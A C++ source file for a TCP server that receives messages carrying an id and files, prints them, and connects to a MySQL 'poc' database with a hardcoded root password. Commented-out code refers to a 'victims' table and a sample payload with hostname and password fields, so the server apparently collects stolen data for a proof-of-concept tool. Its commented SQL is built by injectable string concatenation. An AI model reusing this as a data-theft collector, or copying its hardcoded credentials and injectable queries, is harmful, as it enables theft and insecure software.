#include "Server.hpp"
#include "MessageReceiver.hpp"
#include <cstring>
#include <netinet/in.h>
#include <sstream>
#include <sys/socket.h>
#include <unistd.h>

Server::Server()
{
    _socketServer = socket(AF_INET, SOCK_STREAM, 0);

    _dataBase = mysql_init(NULL);
    if(!_dataBase)
        std::cerr << "MySQL initialization failed! " << std::endl;
    _dataBase = mysql_real_connect(_dataBase, "localhost", "root", "passwd123",
        "poc", 0, NULL, 0);
    if(!_dataBase)
        std::cerr << "Database connection Error! " << std::endl;
}

Server::~Server()
{
    close(_socketServer);
}

int Server::getServerSocket() const
{
    return _socketServer;
}

int Server::startServer()
{
    struct sockaddr_in myaddr;
    int listenPort = 4000;
    struct linger linger_opt = {1, 0};

    if (_socketServer == -1) {
        std::cerr << "Setup Fail..." << std::endl;
        return -1;
    }
    std::cout << "Socket successfully created..." << std::endl;
    memset(&myaddr, 0, sizeof(struct sockaddr_in));
    myaddr.sin_family = AF_INET;
    myaddr.sin_port = htons(listenPort);
    myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    setsockopt(_socketServer, SOL_SOCKET, SO_LINGER, &linger_opt, sizeof(linger_opt));
    if (bind(_socketServer, (struct sockaddr*) &myaddr, sizeof(myaddr)) == -1) {
        std::cerr << "Failed to bind the server socket" << std::endl;
        return -1;
    }
    if (listen(_socketServer, 1) == -1) {
        std::cerr << "Failed to listen on the server socket" << std::endl;
        return -1;
    }
    return 0;
}

int Server::clientConnect()
{
    struct sockaddr_in peeraddr;
    socklen_t peeraddr_len;

    std::cout << "Wait new client..." << std::endl;
    return accept(_socketServer, (struct sockaddr*) &peeraddr, &peeraddr_len);
}

void Server::manageClient(int clientSocket)
{
    std::stringstream message_received;
    char char_readed = 'a';

    while (recv(clientSocket, &char_readed, 1, 0)) {
        message_received << char_readed;
    }
    close(clientSocket);
    auto message = MessageReceiver(message_received);

    std::cout << "id: " << message.getParameter("id") << std::endl;
    for (auto& [file_name, file_content] : message.files) {
        std::cout << "file name: " << file_name << std::endl;
        std::cout << "content:\n" << file_content << std::endl;
    }
}

/*
void Server::interpretMessage()
{
    std::string buffer = readResponceIntoString();
    std::string delim = "\r\n";
    int start = 0;
    int end = buffer.find(delim);
    int cycles = Cycles::DB;

    // buffer = "hostname=jean\npassword=jaj\nfood=tomate\r\nNomDuFichier1\r\nje suis un fichier envoyé lala\r\nNomDuFichier2\r\nblabla bla contentnu du ficheri2";
    printf("|%s|\n", buffer.c_str());

    while (end != std::string::npos) {
        std::cout << buffer.substr(start, end - start) << std::endl;

        if (cycles == Cycles::DB)
            continue;
        if (cycles == Cycles::fileName) {
        }
        if (cycles == Cycles::fileContent) {
            cycles = 0;
        }

        cycles++;
        start = end + delim.length();
        end = buffer.find(delim, start);
    }
    close(_socketClient);
}*/

// void Server::printAllVictims()
// {
//    MYSQL_RES* rset;
//    MYSQL_ROW rows;
//    string sql = "SELECT * FROM victims";
//    if(mysql_query(db_conn, sql.c_str())) {
//       message("Error printing all accounts! ");
//       return;
//    }

//    rset = mysql_use_result(db_conn);

//    cout << left << setw(10) << setfill('-') << left << '+'
//         << setw(21) << setfill('-') << left << '+'
//         << setw(21)
//         << setfill('-') << left << '+' << setw(21)
//         << setfill('-')
//         << '+' << '+' << endl;
//    cout << setfill(' ') << '|' << left << setw(9)
//         << "Account"
//         << setfill(' ') << '|' << setw(20) << "First Name"
//         << setfill(' ') << '|' << setw(20) << "Last Name"
//         << setfill(' ') << '|' << right << setw(20)
//         << "Balance" << '|' << endl;

//    cout << left << setw(10) << setfill('-') << left
//        << '+' << setw(21) << setfill('-') << left << '+'
//        << setw(21)
//        << setfill('-') << left << '+' << setw(21) << setfill('-')
//        << '+' << '+' << endl;
//    if(rset) {
//       while((rows = mysql_fetch_row(rset))) {
//          cout << setfill(' ') << '|' << left << setw(9) << rows[0]
//               << setfill(' ') << '|' << setw(20) << rows[1]
//               << setfill(' ') << '|' << setw(20) << rows[2]
//               << setfill(' ') << '|' << right << setw(20)
//               << rows[3] << '|' << endl;
//       }
//       cout << left << setw(10) << setfill('-') << left
//            << '+' << setw(21) << setfill('-') << left << '+'
//            << setw(21)
//            << setfill('-') << left << '+' << setw(21)
//            << setfill('-')
//            << '+' << '+' << endl;
//    }
//    mysql_free_result(rset);
// }

// void Server::createVictim(BankAccount* ba)
// {
//    stringstream ss;
//    ss << "INSERT INTO bank_account(acc_no, fname, lname,
//          balance)"
//       << "values (" << ba->getAccountNumber() << ", '"
//          << ba->getFirstName() + "','"
//          << ba->getLastName() << "',"
//          << ba->getBalance() << ")";
//    if(mysql_query(db_conn, ss.str().c_str()))
//       message("Failed to create account! ");
//    else
//       message("Account creation successful.");
// }
